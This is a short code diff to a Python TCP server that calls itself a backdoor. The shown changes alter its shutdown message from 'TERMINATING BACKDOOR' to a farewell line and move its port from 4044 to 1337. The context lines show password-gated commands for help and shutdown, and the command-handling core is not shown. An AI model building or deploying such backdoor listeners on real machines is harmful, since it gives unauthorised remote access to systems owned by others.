@@ -48,7 +48,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                 PASS_ACPT = True 
                 #create list
            elif data.strip() == "off" and PASS_ACPT:
-                self.request.send(bytearray("TERMINATING BACKDOOR \n", "utf-8"))
+                self.request.send(bytearray("Please don't use me again, GOODBYE \n", "utf-8"))
                 self.server.shutdown()
                 os.kill(os.getpid(),signal.SIGHUP)
            elif data.strip() == "help" and PASS_ACPT:
@@ -84,7 +84,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                     self.request.send(bytearray("INVALID COMMAND \n", "utf-8"))
 
 if __name__ == "__main__":
-   HOST, PORT = "localhost", 4044
+   HOST, PORT = "localhost", 1337
    server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
    print("Server On")
    try:
